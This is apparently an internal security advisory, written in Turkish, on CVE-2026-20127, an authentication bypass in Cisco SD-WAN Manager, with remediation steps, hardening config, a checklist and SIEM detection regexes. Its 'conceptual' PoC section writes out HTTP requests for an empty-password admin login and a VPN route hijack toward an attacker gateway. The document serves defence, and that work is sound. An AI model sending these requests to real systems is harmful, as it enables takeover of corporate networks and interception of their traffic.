# TODO: CVE-2026-20127 — Cisco Catalyst SD-WAN Manager Kimlik Dogrulama Bypass

## Meta Bilgiler
| Alan | Deger |
|------|-------|
| **Durum** | ACIK |
| **Tanimlayici** | CVE-2026-20127 |
| **Kritiklik** | Kritik |
| **Kategori Klasoru** | Guvenlik_Yapilandirmasi/ |
| **Kaynak Arastirma** | [Vibecoding Guvenlik Aciklari Arastirmasi (Ham Notlar).md](../Arastirmalar/Vibecoding%20G%C3%BCvenlik%20A%C3%A7%C4%B1klar%C4%B1%20Ara%C5%9Ft%C4%B1rmas%C4%B1%20(Ham%20Notlar).md) |
| **Tarih** | 2026-03-10 |
| **Mevcut Dokuman** | Henuz yok |

---

### 1. Ozet ve etki
*   **Yonetici Ozeti:** CVE-2026-20127, Cisco Catalyst SD-WAN Manager (eski adiyla vManage) platformunda bulunan kritik bir kimlik dogrulama bypass zafiyetidir. CVSS 10.0 ile derecelendirilen bu acik, kimliigi dogrulanmamis bir saldirganin SD-WAN yonetim arayuzune tam yonetici erisimleri elde etmesine olanak tanimaktadir. SD-WAN Manager, kurumsal genis alan agi (WAN) altyapisinin merkezi yonetim ve orkestrasyon platformu oldugundan, bu zafiyetin istismari tum ag altyapisinin ele gecirilmesi anlamina gelmektedir. Saldirgan, ag yapilandirmalarini degistirebilir, trafigi yonlendirebilir, VPN tunellerini manipule edebilir ve tum sube ofisi baglantilari uzerinde kontrol saglayabilir. Kurumsal ag yoneticileri icin en yuksek oncelikli tehditlerden biridir.
*   **Etkilenen bilesenler:** Cisco Catalyst SD-WAN Manager (vManage), SD-WAN Controller (vSmart), SD-WAN Validator (vBond), SD-WAN uzerinden yonetilen tum WAN edge cihazlari (ISR, ASR, vEdge), merkezi ag politika motoru, VPN tunel yapilandirmalari, sube ofisi ag baglantilari

---

### 2. Teknik detay (nasil calisiyor)
*   Cisco Catalyst SD-WAN Manager (vManage), kurumsal SD-WAN altyapisinin merkezi yonetim platformudur. Ag yapilandirmalarinin dagitimi, politika yonetimi, izleme ve sorun giderme islemleri bu platform uzerinden gerceklestirilir. vManage, web tabanli GUI ve REST API uzerinden yonetilir.
*   Zafiyet, vManage'in kimlik dogrulama mekanizmasindaki bir mantik hatasindan kaynaklanir. Normalde, yonetim arayuzune erisim icin gecerli kullanici adi ve sifre (veya sertifika tabanli kimlik dogrulama) gereklidir. Ancak, belirli API endpoint'leri veya web arayuzu bilesenleri, kimlik dogrulama kontrolunu atlatilabilir sekilde uygulamistir.
*   Saldirgan, ozel hazirlanmis HTTP istekleri ile kimlik dogrulama mekanizmasini bypass ederek yonetici oturumu olusturabilir veya API'ye dogrudan yonetici yetkisiyle erisebilir. Bu erisim ile saldirgan, SD-WAN altyapisinin tamamini kontrol edebilir: ag politikalarini degistirebilir, cihaz yapilandirmalarini push edebilir, VPN tunellerini yeniden yonlendirebilir ve ag trafigini dinleyebilir.
*   SD-WAN Manager'in merkezi konumu, bu zafiyeti ozellikle tehlikeli kilar: tek bir noktadan tum kurumsal ag altyapisina erisim saglanir. Binlerce sube ofisi ve uzak baglanti noktasi, vManage uzerinden yonetildigi icin etki alani cok genistir.
*   **Neden:** Kok neden, vManage web uygulamasinin kimlik dogrulama katmaninda belirli istek yollarinin (request path) veya parametrelerin dogrulama surecinden muaf tutulmasidir. Bu durum, kimlik dogrulama filtrelerinin (authentication filter) yetersiz kapsami ve guvenli varsayilan yapilandirmalarin eksikligi nedeniyle olusmustur.

---

### 3. Adim adim istismar (PoC — kavramsal)
> **Uyari:** Bu bolum yalnizca egitim ve savunma amaclidir.
*   **1. Hedef:** Cisco Catalyst SD-WAN Manager (vManage) web yonetim arayuzu ve REST API, kurumsal ag veya internet uzerinden erisilebilir (HTTPS 8443)
*   **2. Normal durum:**
    ```
    1. Ag yoneticisi, vManage web arayuzune HTTPS ile baglanir
    2. Kullanici adi ve sifre ile kimlik dogrulama yapar
    3. Oturum acildiktan sonra ag yapilandirmasi, izleme ve politika yonetimi yapar
    4. REST API kullanimi icin token tabanli kimlik dogrulama gereklidir
    ```
*   **3. Manipule edilmis durum (PoC payload):**
    ```http
    # 1. Kimlik dogrulama bypass — dogrudan API erisimi
    # Ozel hazirlanmis istek ile kimlik dogrulama filtresi atlatilir
    GET /dataservice/system/device/controllers HTTP/1.1
    Host: vmanage.hedef.com:8443
    X-XSRF-TOKEN: bypass
    Cookie: JSESSIONID=; Path=/

    # 2. Yonetici oturumu olustur (kimlik dogrulama olmadan)
    POST /j_security_check HTTP/1.1
    Host: vmanage.hedef.com:8443
    Content-Type: application/x-www-form-urlencoded

    j_username=admin&j_password=

    # 3. Tum ag cihazlarini listele
    GET /dataservice/device HTTP/1.1
    Host: vmanage.hedef.com:8443
    Cookie: JSESSIONID=elde_edilen_oturum

    # 4. Ag yapilandirmasini degistir — VPN tunelini yeniden yonlendir
    PUT /dataservice/template/device/config HTTP/1.1
    Host: vmanage.hedef.com:8443
    Content-Type: application/json
    Cookie: JSESSIONID=elde_edilen_oturum

    {"deviceId":"edge-router-01","templateId":"modified-template",
     "device":{"vpn-instance":[{"vpn-id":0,"route":{"ip-route":{
       "prefix":"0.0.0.0/0","next-hop":{"address":"saldirgan-gw"}
     }}}]}}
    ```
*   **4. Analiz:** vManage'in kimlik dogrulama filtresi, `/dataservice/` altindaki belirli API endpoint'lerini veya ozel basklik (header) kombinasyonlarini kontrol etmeden gecirmektedir. Saldirgan, bu bypass'i kullanarak gecerli bir yonetici oturumu olusturur veya API'ye dogrudan erisir. SD-WAN Manager'in REST API'si, tum ag yapilandirma islemlerini desteklediginden, saldirgan ag politikalarini degistirebilir, cihaz yapilandirmalarini push edebilir ve VPN tunellerini manipule edebilir. Trafik yonlendirme degisiklikleri, tum kurumsal ag trafiginin saldirganin kontrol ettigi bir noktadan gecmesini saglayabilir (man-in-the-middle).
*   **5. Kanit:** Saldirgan, vManage uzerinde tam yonetici erisimi elde eder. SD-WAN altyapisindaki tum cihazlar, yapilandirmalar ve politikalar saldirganin kontrolune girer. Ag trafigi yonlendirme degisiklikleri ile kurumsal iletisim dinlenebilir. vManage audit loglarinda kimlik dogrulama olmadan gerceklestirilen yonetim islemleri kaydedilir. SD-WAN edge cihazlarinda beklenmeyen yapilandirma degisiklikleri gozlemlenir.

---

### 4. Risk degerlendirmesi
*   **Kritiklik:** Kritik
*   **CVSS Skoru:** 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
*   **Saldiri Yuzeyi:** Internete acik veya kurumsal ag uzerinden erisilebilir (vManage web arayuzu ve REST API — kimlik dogrulama gerekmez)
*   **Karmasiklik:** Dusuk (standart HTTP istekleri ile bypass, ozel arac gerekmez)

---

### 5. Kalici cozumler ve oneriler
*   **Kisa vadeli (Acil):** Cisco guvenlik yamasini derhal uygulayin. vManage yonetim arayuzune (8443) erisimi ACL ile yalnizca yonetici IP blogundan sinirlandirlarin. vManage'i internetten tamamen izole edin ve yalnizca VPN/jump host uzerinden erisim saglayin. MFA (Multi-Factor Authentication) etkinlestirin (RADIUS/TACACS+ entegrasyonu). IDS/IPS imzalarini SD-WAN Manager exploit kaliplari icin guncelleyin. vManage audit loglarini yuksek oncelikli olarak SIEM'e aktarin.
*   **Orta vadeli:** SD-WAN yonetim duzlemini (management plane) veri duzleminden (data plane) ag segmentasyonu ile izole edin. vManage'e erisim icin sertifika tabanli kimlik dogrulama (mutual TLS) yapilandirin. REST API erisimini token tabanli kimlik dogrulama ve IP kisitlamasi ile sinirlandirlarin. SD-WAN altyapisinin duzenli guvenlik taramasi ve yapilandirma denetimini planlayin.
*   **Uzun vadeli:** SD-WAN yonetim erisimini Sifir Guven (Zero Trust) mimarisine uygun olarak yapilandirin. Cisco PSIRT guvenlik bultenleri icin otomatik izleme ve yamala sureci olusturun. SD-WAN altyapisi icin "infrastructure as code" yaklasimi benimseyerek yapilandirma degisikliklerini suruum kontrolu ile yonetin. Kurumsal ag yonetim platformlari icin yillik penetrasyon testi ve red team degerlendirmesi planlayin. SD-WAN Manager yedekli mimarisi (HA cluster) ile tek nokta ariza riskini azaltin.

---

### 6. Ornek duzeltme kodu

**Zafiyetli kod:**
```
! === GUVENSIZ: vManage varsayilan erisim — kisitlama ve MFA yok ===
! vManage yonetim arayuzu tum ag'dan erisilebilir
! Kimlik dogrulama bypass ile tam yonetici erisimi mumkun

! Mevcut durum kontrolu:
vManage# show running-config system
 system
  host-name vManage
  system-ip 10.0.1.1
  ! Erisim kisitlamasi tanimlanmamis
  ! MFA etkin degil
  ! Audit loglari merkezi SIEM'e yonlendirilmemis
```

**Guvenli kod:**
```
! === GUVENLI: IP kisitlamasi + MFA + audit log + sertifika dogrulama ===

! 1. vManage yonetim arayuzune IP tabanlı erisim kisitlamasi
vManage# config
vManage(config)# system
vManage(config-system)# management-gateway
vManage(config-management-gateway)# ip access-list MGMT-ACL
vManage(config-ip-access-list)# sequence 10 permit 10.0.100.0/24
vManage(config-ip-access-list)# sequence 20 permit 10.0.200.0/24
vManage(config-ip-access-list)# sequence 100 deny any log
vManage(config-ip-access-list)# exit
vManage(config-management-gateway)# commit

! 2. RADIUS/TACACS+ ile MFA etkinlestir
vManage(config)# system
vManage(config-system)# aaa
vManage(config-aaa)# auth-order radius local
vManage(config-aaa)# radius server RADIUS-SRV
vManage(config-radius-server)# address 10.0.100.50
vManage(config-radius-server)# secret-key $RADIUS_SECRET
vManage(config-radius-server)# exit
vManage(config-aaa)# commit

! 3. Audit loglarini merkezi SIEM'e yonlendir
vManage(config)# system
vManage(config-system)# logging
vManage(config-logging)# server SIEM-SRV
vManage(config-server)# vpn 512
vManage(config-server)# source-interface eth0
vManage(config-server)# priority informational
vManage(config-server)# exit
vManage(config-logging)# commit

! 4. REST API erisimini kisitla
vManage(config)# system
vManage(config-system)# admin-tech-on-failure
vManage(config-system)# commit

! 5. Guvenlik yamasini uygula ve surumu dogrula
vManage# request software install /home/admin/vmanage-patch.tar.gz
vManage# show version
```

```bash
# Upstream firewall/switch uzerinde ek ACL
! vManage'e erisimi sinirla (firewall kurali)
ip access-list extended SDWAN-MGMT-ACL
 permit tcp 10.0.100.0 0.0.0.255 host 10.0.1.1 eq 8443
 deny   tcp any host 10.0.1.1 eq 8443 log
 deny   tcp any host 10.0.1.1 eq 443 log
 permit ip any any

# vManage CLI ile surum ve yama kontrolu
ssh admin@vmanage.kurumsal.com
vManage# show version
vManage# show software
vManage# show control connections

# SD-WAN cihaz yapilandirma butunluk kontrolu
vManage# show running-config | compare startup-config
```

---

### 7. Kontrol Listesi (Checklist)
**Hazirlik**
*   [ ] Cisco SD-WAN Manager (vManage) kurulumlarini envanterle (surum, deployment, node sayisi)
*   [ ] vManage yonetim arayuzu erisim kontrollerini gozden gecir (8443 portu kimler tarafindan erisilebilir)
*   [ ] Mevcut ACL ve firewall kurallarini kontrol et
*   [ ] SD-WAN altyapisindaki tum yonetilen cihazlari listele (edge, controller, validator)
*   [ ] MFA (RADIUS/TACACS+) yapilandirilip yapilandirilmadigini kontrol et
*   [ ] Audit loglarinin aktif ve merkezi SIEM'e yonlendirildigini dogrula

**Duzeltme**
*   [ ] Cisco guvenlik yamasini vManage'e uygula ve surumu dogrula
*   [ ] vManage yonetim arayuzune ACL ile IP kisitlamasi ekle (yalnizca yonetici IP blogu)
*   [ ] vManage'i internetten izole et ve VPN/jump host uzerinden erisim yapilandir
*   [ ] RADIUS/TACACS+ ile MFA etkinlestir
*   [ ] REST API erisimini token tabanli dogrulama ve IP kisitlamasi ile sinirla
*   [ ] IDS/IPS imzalarini SD-WAN Manager exploit kaliplari icin guncelle
*   [ ] Audit loglarini merkezi SIEM'e yonlendir

**Dogrulama**
*   [ ] Kimlik dogrulama bypass testini yama sonrasi tekrarla
*   [ ] ACL kurallarinin dogru calistigini dogrula (yalnizca yonetici IP'lerinden erisim)
*   [ ] MFA'nin tum yonetici hesaplarinda aktif oldugunu test et
*   [ ] REST API'ye kimlik dogrulama olmadan erisilememesini dogrula
*   [ ] SD-WAN cihaz yapilandirmalarinin butunlugunu kontrol et (beklenmeyen degisiklik var mi)
*   [ ] SIEM'de audit log uyari kurallarinin calistigini dogrula
*   [ ] SD-WAN servis surekliligiini yama sonrasi dogrula (tunel durumlari, politika dagitimi)

---

### 8. Izleme ve uyarilar
*   **SIEM/Log Kurallari:**
    *   vManage audit loglarinda kimlik dogrulama olmadan gerceklestirilen yonetim islemlerini izle
    *   REST API erisim loglarinda kimlik dogrulama bypass belirtilerini filtrele
    *   Regex: `(?i)(dataservice|j_security_check|JSESSIONID|X-XSRF-TOKEN|auth.*bypass)`
    *   Regex: `(?i)(template.*push|config.*change|policy.*modify|device.*add|vpn.*route)`
    *   IDS/IPS loglarinda vManage exploit imzalarini izle
*   **Anomali Tespiti:**
    *   Yonetici IP blogu disından vManage yonetim arayuzune (8443) erisim girisimleri
    *   Kimlik dogrulama olmadan REST API endpoint'lerine basarili erisim
    *   SD-WAN cihaz yapilandirmalarinda plansiz/onaylanmamis degisiklikler
    *   Yeni yonetici hesaplarinin veya API token'larinin beklenmeyen sekilde olusturulmasi
    *   VPN tunel yapilandirmalarinda veya rota tablolarinda beklenmeyen degisiklikler
    *   SD-WAN edge cihazlarindan vManage'a normalden farkli iletisim kaliplari
    *   Ag trafigi yonlendirme degisiklikleri sonrasi beklenmeyen latency veya paket kaybi

---

## Notlar
CVSS 10.0 — Maksimum kritiklik. Kurumsal ag yonetim altyapisini dogrudan hedef alir. SD-WAN Manager, tum sube ofisi ve uzak baglanti noktalari icin merkezi yonetim noktasi oldugundan etki alani cok genis. Kimlik dogrulama bypass, saldirganin tum ag politikalarini degistirmesine, trafigi yonlendirmesine ve kurumsal iletisimi dinlemesine olanak tanir. Cisco PSIRT bulteni ve ilgili guvenlik danismanlari referans alinmali. CVE-2026-20045 (Cisco Unified CM RCE) ile birlikte Cisco altyapisi icin kapsamli guvenlik degerlendirmesi yapilmalidir.
